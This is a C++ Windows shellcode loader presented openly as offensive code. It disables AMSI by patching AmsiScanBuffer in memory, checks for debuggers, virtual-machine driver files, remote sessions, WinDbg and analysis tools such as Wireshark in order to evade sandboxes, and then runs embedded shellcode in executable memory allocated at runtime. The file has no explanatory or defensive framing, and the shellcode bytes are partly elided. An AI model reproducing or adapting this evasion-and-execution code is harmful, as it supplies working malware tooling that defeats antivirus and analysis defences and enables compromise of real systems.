#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// Function declarations
typedef LPVOID (WINAPI *PVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *PCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI *PWaitForSingleObject)(HANDLE, DWORD);

void disableAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        std::cerr << "Failed to load AMSI DLL." << std::endl;
        return;
    }

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        std::cerr << "Failed to get AMSI Scan Buffer address." << std::endl;
        return;
    }

    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "Failed to change memory protection." << std::endl;
        return;
    }

    *(BYTE*)pAmsiScanBuffer = 0xC3; // RET instruction
    VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
}

bool isDebuggerPresent() {
    return IsDebuggerPresent();
}

bool checkSandboxArtifacts() {
    std::vector<const char*> artifacts = {
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        "C:\\windows\\system32\\drivers\\VBoxSF.sys"
    };

    for (const auto& artifact : artifacts) {
        HANDLE hFile = CreateFileA(artifact, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            return false;
        }
    }
    return true;
}

bool checkSystemMetrics() {
    return GetSystemMetrics(SM_REMOTESESSION) == 0;
}

bool checkParentProcess() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot." << std::endl;
        return false;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == GetCurrentProcessId()) {
                HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);
                if (!hParent) {
                    std::cerr << "Failed to open parent process." << std::endl;
                    CloseHandle(hSnapshot);
                    return false;
                }

                WCHAR parentName[MAX_PATH];
                DWORD size = MAX_PATH;
                if (QueryFullProcessImageName(hParent, 0, parentName, &size) && wcsstr(parentName, L"WINDBG.EXE")) {
                    CloseHandle(hParent);
                    CloseHandle(hSnapshot);
                    return true;
                }

                CloseHandle(hParent);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return false;
}

bool checkRunningProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot." << std::endl;
        return false;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (wcsstr(pe32.szExeFile, L"WIRESHARK.EXE") || wcsstr(pe32.szExeFile, L"PROCEXP.EXE")) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return false;
}

void executeShellcode(unsigned char* shellcode, size_t shellcodeSize) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        std::cerr << "Failed to get handle for kernel32.dll" << std::endl;
        return;
    }

    PVirtualAlloc pVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    PCreateThread pCreateThread = (PCreateThread)GetProcAddress(hKernel32, "CreateThread");
    PWaitForSingleObject pWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!pVirtualAlloc || !pCreateThread || !pWaitForSingleObject) {
        std::cerr << "Failed to resolve required functions" << std::endl;
        return;
    }

    LPVOID exec_mem = pVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        std::cerr << "Memory allocation failed" << std::endl;
        return;
    }

    memcpy(exec_mem, shellcode, shellcodeSize);

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Thread creation failed" << std::endl;
        return;
    }

    pWaitForSingleObject(hThread, INFINITE);
}

int main() {
    // Example shellcode (replace with your actual shellcode)
    unsigned char shellcode[] =
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        //... (shellcode continues)
        "\xb8\x6e\x6e\x6e\x6e\xff\xd0\x60\xe9\x5b\xff\xff\xff";

    size_t shellcodeSize = sizeof(shellcode) - 1;

    // Perform checks
    if (isDebuggerPresent() || !checkSystemMetrics() || !checkSandboxArtifacts() || checkParentProcess() || checkRunningProcesses()) {
        std::cout << "Sandbox or Debugger detected. Exiting..." << std::endl;
        return 1;
    }

    // Disable AMSI
    disableAMSI();

    // Execute the shellcode
    executeShellcode(shellcode, shellcodeSize);

    return 0;
}
